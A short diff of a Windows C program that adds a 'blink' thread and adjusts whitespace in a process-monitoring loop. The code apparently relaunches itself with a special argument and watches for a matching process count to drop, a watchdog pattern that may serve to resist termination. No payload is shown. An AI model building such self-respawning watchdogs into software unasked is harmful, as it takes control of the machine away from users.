@@ -8,12 +8,15 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 
 	int argc;
 	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
+
 	
 	if (argc > 1 && !lstrcmpW(argv[1], ARG)) {
 
 		CreateThread(NULL, NULL, &monitorT, NULL, 0, NULL);
 	}
 	else {
+		
+		CreateThread(NULL, NULL, &blink, NULL, 0, NULL);
 
 		LPWSTR procn = (LPWSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH * 2);
 		GetModuleFileName(NULL, procn, MAX_PATH * 2);
@@ -80,12 +83,9 @@ DWORD WINAPI monitorT(LPVOID p) {
 				procAmount++;
 			}
 
-			
-
 		} while (Process32Next(snap, &entry));
 
 		CloseHandle(snap);		// Snapshot will change each time a process is being created, make sure it is updated
-
 
 		if (procAmount < prevProcAmount) {
 
